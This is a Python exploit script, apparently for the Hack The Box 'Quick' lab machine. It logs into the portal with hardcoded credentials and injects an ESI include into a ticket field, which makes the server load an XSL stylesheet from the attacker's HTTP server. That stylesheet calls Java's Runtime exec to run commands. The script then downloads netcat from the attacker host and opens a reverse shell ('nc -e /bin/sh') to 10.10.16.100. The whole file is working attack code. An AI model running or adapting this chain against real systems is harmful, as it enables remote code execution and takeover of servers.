import shutil
import random
import threading
import sys
import os
import requests
import http.server

def run(server_class=http.server.HTTPServer, handler_class=http.server.SimpleHTTPRequestHandler):
    server_address = ('', 8000)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()

def login():
    session = requests.Session()

    res = session.post("http://portal.quick.htb:9001/login.php", data={"email": "elisa@wink.co.uk", "password": "Quick4cc3$$"})
    return session

def write_rce(cmd):
    contents =  f"""<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
  <xsl:variable name="cmd"><![CDATA[{cmd}]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>"""
    with open("rce.xsl", "w") as f:
        f.write(contents)


def attempt(session, cmd):
    write_rce(cmd)

    payload = f"www/payload_{random.randint(100000, 999999)}.xsl"
    shutil.copyfile("rce.xsl", payload)

    dummy = f"www/dummy_{random.randint(100000,999999)}.html"
    shutil.copyfile("test.html", dummy)

    padding = f"""
    TKT-9999sdfsdaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbcccccddddddeeeeffffgggghhhhiiiijjjkkkkjllllmmmmnnnnoZZZZsdfsfffffffZ");
    </script>
    """

    attack = f"""
    <body>
    <esi:include src="http://10.10.16.100:8000/{dummy}" stylesheet="http://10.10.16.100:8000/{payload}" />
    </body>
        """

    res = session.post("http://portal.quick.htb:9001/ticket.php", data={"title":"dont", "msg":"care","id":padding+attack})

    if res.status_code == 200 or True:
        print(res.text)
        print(res.status_code)


def main():
    os.mkdir("www", 0o755)
    thread = threading.Thread(target=run)
    thread.daemon = True
    thread.start()

    session = login()
    for cmd in ["wget http://10.10.16.100:8000/nc",
                "chmod +x nc",
                "./nc -e /bin/sh 10.10.16.100 4444",
                "rm nc"]:
        print(f"executing: {cmd}")
        attempt(session, cmd)

    shutil.rmtree("www")


if __name__ == "__main__":
    main()
